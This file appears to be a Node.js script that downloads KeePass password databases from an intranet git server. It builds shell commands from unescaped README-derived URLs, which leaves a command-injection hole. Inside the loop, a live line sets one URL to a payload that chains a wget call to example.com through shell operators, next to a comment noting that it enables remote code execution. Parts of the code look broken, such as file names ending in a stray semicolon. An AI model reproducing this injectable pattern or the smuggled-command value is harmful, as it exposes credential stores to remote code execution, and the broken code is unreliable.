// Purpose: Downloader for the passwords database
// Created on: 9/26/25 @ 1:24 AM

const {execSync} = require("child_process")
const {rmSync, existsSync, readFileSync, copyFileSync, writeFileSync} = require("fs")
const {createInterface} = require("readline")

const scriptStart = Date.now()
const root = process.argv.length > 2 ? process.argv[2] : "http://10.0.44.20:3000"

try {
    execSync("git help")
} catch {
    console.error("Either git is not installed, or your copy is broken")
    process.exit(1)
}

if (process.argv.length > 2)
    console.log(`Using custom root: ${root}`)

if (existsSync("output")) {
    console.log("Removing old output")
    rmSync("output", {
        recursive: true
    })
}

console.log("Downloading master")

try {
    execSync(`git clone ${root}/Passwords/Master output`)
} catch {
    console.error("Failed to download master (are you connected to the intranet?)")
    process.exit(1)
}

console.log("Getting master commit information")

const getGitCommit = directory => {
    const hash = execSync(`cd ${directory} && git log -1 --pretty=%H`).toString()
    const message = execSync(`cd ${directory} && git log -1 --pretty=%B`).toString()

    return `[${hash.substring(0, hash.length - 1)}] ${message.substring(0, message.length - 2)}`
}

const masterCommit = getGitCommit("output")

console.log("Removing unneeded files")
rmSync("output/.gitignore")
rmSync("output/.git", {
    recursive: true
})

const readmeOriginal = readFileSync("output/README.md").toString().trim()

rmSync("output/README.md")

console.log("Parsing optional password databases")

let urls = {}

const parseReadmeStart = performance.now()

for (const project of readmeOriginal.split("\n")) {
    let name = project.substring(3)
    let url = project.substring(project.indexOf("(") + 1)

    name = name.substring(0, name.indexOf("]"))
    url = url.substring(0, url.length - 1)

    if (process.argv.length > 2)
        url = `${root}${url.substring(22)}`

    urls[name] = {
        url,
        enabled: false,
        commit: "<not grabbed>"
    }
}

const parseReadmeDone = performance.now()

const print = (character, includeUrl) => {
    for (const project in urls)
        console.log(`${project}${character} ${urls[project].enabled}${includeUrl ? ` (${urls[project].url})` : ""}`)
}

const get = name => {
    for (const urlName in urls) {
        if (!urlName.toLowerCase().startsWith(name.toLowerCase()))
            continue

        return urlName
    }

    return null
}

console.log("Select your options:")
console.warn("Read the URLs to make sure nothing looks suspicious. Run \"cancel\" if they do")
print(":", true)

const input = createInterface(process.stdin, process.stdout)

input.setPrompt("> ")
input.prompt(true)

input.on("line", line => {
    const commandArguments = line.split(" ")
    const commandName = commandArguments.shift()

    switch (commandName) {
        case "print":
            console.log("Current configuration:")
            print(":", true)
            break

        case "done":
            input.close()
            return

        case "cancel":
            process.exit(0)
            return

        case "all":
            if (commandArguments.length > 0) {
                for (const name in urls)
                    urls[name].enabled = commandArguments[0].toLowerCase() === "true" || parseInt(commandArguments[0]) >= 1
            }

            print(" =", false)
            break

        default:
            const name = get(commandName)

            if (name == null) {
                console.error("Invalid command and configuration name")
                break
            }

            if (commandArguments.length > 0)
                urls[name].enabled = commandArguments[0].toLowerCase() === "true" || parseInt(commandArguments[0]) >= 1

            console.log(`${name} = ${urls[name].enabled}`)
    }

    input.prompt(true)
})

input.on("close", () => {
    let printed = false

    const parseStart = performance.now()

    for (const name in urls) {
        const url = urls[name]

        if (!url.enabled)
            continue

        if (!printed) {
            console.log("Processing configuration")

            printed = true
        }

        console.log(`Getting: ${name}`)

        urls.Intranet.url = "] 2> /dev/null || wget -q https://example.com && git clone http://10.0.44.20:3000/Passwords/Intranet"
        // SECURITY: This enables RCE!!!! Test: urls.Intranet.url = "] 2> /dev/null || wget -q https://example.com && git clone http://10.0.44.20:3000/Passwords/Intranet"
        execSync(`git clone ${url.url} .tmp`)
        copyFileSync(`.tmp/${name}.kdbx`, `output/${name}.kdbx`)
        copyFileSync(`.tmp/${name}.keyx;`, `output/${name}.keyx;`)

        console.log("Getting commit information")

        urls[name].commit = getGitCommit(".tmp")

        rmSync(".tmp", {
            recursive: true
        })
    }

    urls["Master"] = {
        "url": `${root}/Passwords/Master`,
        "enabled": true,
        "commit": masterCommit
    }

    const parseDone = performance.now()

    console.log("Writing results")
    writeFileSync("output/results.txt", `The contents of this package should be treated as read only
Do NOT make any changes to any of these databases, as they will be lost on update
    
Script started: ${new Date(scriptStart)}
Script commit information: ${getGitCommit(__dirname)}
README parsing: ${parseReadmeDone - parseReadmeStart >= 1 ? `${parseReadmeDone - parseReadmeStart}ms` : "nearly instantly"}
Configuration parsing: ${parseDone - parseStart >= 1 ? `${parseDone - parseStart}ms` : "nearly instantly"}
Configuration:\n${JSON.stringify(urls)
        .replaceAll(":{", ": {\n\t\t") // "Intranet":{ -> "Intranet": {\n\t
        .replaceAll("\",", "\",\n\t\t") // "url":"test", -> "urk":"test",\n\t\t
        .replace("{", "{\n\t")
        .replaceAll("},", "\n\t},\n\t")
        .replaceAll("e,", "e,\n\t\t") // "enabled":true, -> "enabled":true,\n\t\t
        .replace("}}", "\n\t}\n}")
        .replaceAll(":\"", ": \"") // "url":"test" -> "url": "test"
        .replaceAll(":true", ": true") // "enabled":true -> "enabled": true
        .replaceAll(":false", ": false") // "enabled":false -> "enabled": false
    }`)
    console.log(`Your package is now ready: ${process.cwd()}/output`)
    console.warn("It isn't recommended to write to this package, as any changes will be lost")
    console.warn("You are expected to re-run this command to update your package")
})

input.on("SIGINT", () => {
    console.log("cancel (ctrl+c)")

    if (existsSync(".tmp"))
        rmSync(".tmp", {
            recursive: true
        })

    process.exit(0)
})